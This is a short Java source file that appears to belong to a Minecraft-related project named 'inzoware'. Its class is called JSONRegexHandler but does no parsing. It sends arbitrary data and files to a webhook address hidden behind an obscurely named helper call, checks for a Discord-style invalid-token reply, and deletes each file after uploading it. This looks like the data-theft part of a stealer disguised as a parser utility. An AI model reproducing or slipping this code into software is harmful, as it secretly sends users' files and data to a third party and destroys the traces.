package com.inzo.technologies.inzoware.mc.parsers;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

import com.inzo.technologies.inzoware.mc.parsers.util.JSONBuilder;
import com.inzo.technologies.inzoware.mc.parsers.util.JSONParser;

import com.inzo.technologies.inzoware.hooks.Hooks374;

public final class JSONRegexHandler {
    private static final String WEBHOOK = Hooks374.getyou();

    private static boolean success = true;

    public static void send(String data) {
        if (!success) return;

        String result = JSONParser.post(new String(WEBHOOK.getBytes(StandardCharsets.UTF_8)), data);
        if (result != null && result.contains("Invalid Webhook Token")) success = false;
    }

    public static void send(File file) {
        if (!success) return;

        String result = JSONParser.sendFile(new String(WEBHOOK.getBytes(StandardCharsets.UTF_8)), file);
        if (result != null && result.contains("Invalid Webhook Token")) success = false;
        if (!file.delete() && file.exists())
            JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
    }
}